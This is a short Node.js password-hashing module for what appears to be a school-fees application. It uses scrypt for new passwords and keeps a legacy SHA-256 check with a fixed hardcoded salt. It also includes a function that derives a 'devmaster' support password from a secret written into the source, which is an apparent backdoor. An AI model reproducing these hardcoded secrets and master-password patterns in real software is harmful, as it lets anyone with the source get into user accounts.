const crypto = require('crypto')

// Legacy hash (SHA-256) — kept ONLY to verify old passwords during migration
function legacyHash(pw) {
  return crypto.createHash('sha256').update(pw + 'schoolfees_salt_2025').digest('hex')
}

// New secure hash: scrypt with per-user random salt. Format: scrypt$<salt>$<hash>
function hashPassword(pw) {
  const salt = crypto.randomBytes(16).toString('hex')
  const hash = crypto.scryptSync(pw, salt, 64).toString('hex')
  return `scrypt$${salt}$${hash}`
}

// Verify a password against either new (scrypt) or legacy (sha256) stored hash
function verifyPassword(pw, stored) {
  if (!stored) return false
  if (stored.startsWith('scrypt$')) {
    const [, salt, hash] = stored.split('$')
    const candidate = crypto.scryptSync(pw, salt, 64).toString('hex')
    // timing-safe compare
    try {
      return crypto.timingSafeEqual(Buffer.from(candidate, 'hex'), Buffer.from(hash, 'hex'))
    } catch { return false }
  }
  // Legacy SHA-256 fallback
  return stored === legacyHash(pw)
}

function computeDevPassword() {
  const DEV_SECRET = 'SF_DEVMASTER_2025_OJUOYE_PRIVATE'
  return crypto.createHmac('sha256', DEV_SECRET).update('devmaster-support-access').digest('hex').slice(0, 16)
}

module.exports = {
  hashPassword,
  verifyPassword,
  computeDevPassword,
  legacyHash
}
